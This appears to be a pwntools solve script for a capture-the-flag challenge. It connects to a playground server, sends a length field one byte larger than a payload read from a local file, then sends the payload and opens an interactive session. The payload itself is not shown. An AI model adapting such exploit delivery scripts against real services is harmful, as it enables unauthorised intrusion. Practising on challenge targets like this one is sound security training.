from pwn import *

p = remote("dos2.playground.cyberhero.rs", 9108)
sol_bytes = open("./input.txt", "rb").read()

p.recvuntil(b'Payload length:\n')
p.sendline(str(len(sol_bytes) + 1).encode())
p.recvuntil(b'Payload:\n')
p.sendline(sol_bytes)
p.interactive()
